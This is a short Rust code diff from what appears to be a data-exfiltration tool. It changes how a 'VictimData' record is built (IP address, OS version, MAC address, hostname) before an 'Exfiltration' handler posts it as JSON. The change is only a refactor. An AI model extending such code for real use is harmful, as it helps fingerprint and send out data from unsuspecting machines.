@@ -20,7 +20,7 @@ struct InstanceData {
 
 #[derive(Serialize)]
 struct VictimData {
-    address: String,
+    address: Option<String>,
     operating_system_version: String,
     mac_address: Option<String>,
     hostname: Option<String>,
@@ -80,10 +80,10 @@ impl Exfiltration {
                 state.0.instance_identifier
             ))
             .json(&VictimData {
-                address: match remote_address.0.as_socket_addr() {
-                    Some(socket) => socket.ip().to_string(),
-                    None => "Unknown".into(),
-                },
+                address: remote_address
+                    .0
+                    .as_socket_addr()
+                    .map(|socket| socket.ip().to_string()),
                 operating_system_version: data.0.operating_system_version,
                 mac_address: data.0.mac_address,
                 hostname: data.0.hostname,
